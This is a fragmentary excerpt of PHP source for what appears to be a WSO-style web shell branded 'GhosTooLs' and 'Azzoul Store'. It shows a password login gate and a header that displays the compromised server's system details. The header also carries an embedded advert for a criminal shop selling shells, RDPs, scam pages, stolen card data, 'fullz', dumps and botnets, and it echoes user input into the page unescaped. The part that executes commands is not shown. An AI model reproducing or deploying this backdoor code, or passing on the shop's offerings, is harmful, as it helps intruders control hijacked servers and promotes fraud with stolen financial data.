...
function hardLogin() { 
    ...
    die("<pre align=center><form method=post>GhosTooLs<br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='mypass' value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>"); 
} 
...
function hardHeader() { 
    ...
    echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>Azzoul Store - " . $_SERVER['HTTP_HOST'] . " - WSO " . VERSION ."</title> 
<style> 
...
<input type=hidden name=charset> 
    ...
    /* (С) 08.2015 dmkcv */ 
    echo '<table class=info cellpadding=3 cellspacing=0 width=100%><font face="ubuntu" color="#FFDB5F" size=3 >This shell has been purchased on Azzoul Store Visit our shop for more tools ! Click <a href="http://azzoul.net">here</a><br><font color=white size=3 ><font color="white"><b>AZZOUL STORE: </b></font><marquee scrollamount="3" scrolldelay="50" width="90%"><b>Cpanels , Inbox Mailers, Inbox Smtp , Shells , Rdps , Web mail , Leads , SSH , Scam Pages , Fullz+Pins , Dumps , Tutorials , credit cards , botnets , Priv8 Tools , Steam , Accounts ... and More ...</b></marquee></font><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'. 
